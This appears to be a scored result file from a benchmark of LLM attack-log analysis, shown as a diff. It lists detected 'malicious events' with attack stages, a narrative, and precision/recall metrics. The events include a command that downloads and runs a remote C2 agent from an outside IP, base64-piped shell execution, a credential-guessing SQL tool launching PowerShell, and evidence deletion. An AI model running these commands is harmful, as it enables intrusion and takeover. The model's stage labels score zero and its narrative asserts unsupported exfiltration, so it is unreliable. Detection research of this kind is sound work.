@@ -1,0 +1,116 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "sh -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Discovery"
+      },
+      {
+        "command": "curl -O http://169.254.169.254/latest/meta-data/instance-id",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Collection"
+      },
+      {
+        "command": "rm /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$ip=\"https://124.223.85.207:8443\";",
+        "stage": "Execution"
+      },
+      {
+        "command": "rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/webapps/ROOT/logout.jsp -r",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c echo end:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:1185e211-d897-42e4-bb2d-7260f0eba801",
+        "stage": "Collection"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C \\$ip=\"https://124.223.85.207:8443\";",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attacker initiated multiple exfiltration attempts via port 8443 using encrypted HTTPS, indicating communication to an actor-controlled infrastructure, pointing towards Command and Control activities. The use of POST requests suggests sending data to the remote server. Further script execution involving SQL queries and PowerShell commands within those scripts hints at executing arbitrary code on the database or attempting privilege escalation. Script deletion and removal of persistence mechanisms suggest evasive actions. File downloads were performed through web services, possibly collecting sensitive data or additional payloads. Overall, there\u2019s a mix of lateral movement, credential access, collection, defense evasion, execution, and possible initial access.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 28530,
+      "completion_tokens": 8225,
+      "total_tokens": 36755,
+      "wall_clock_s": 158.0,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.4444444444444444,
+      "f1": 0.32,
+      "tp": 4,
+      "fp": 12,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 16,
+      "fn": 7,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 28530,
+      "completion_tokens": 8225,
+      "total_tokens": 36755,
+      "wall_clock_s": 158.0,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
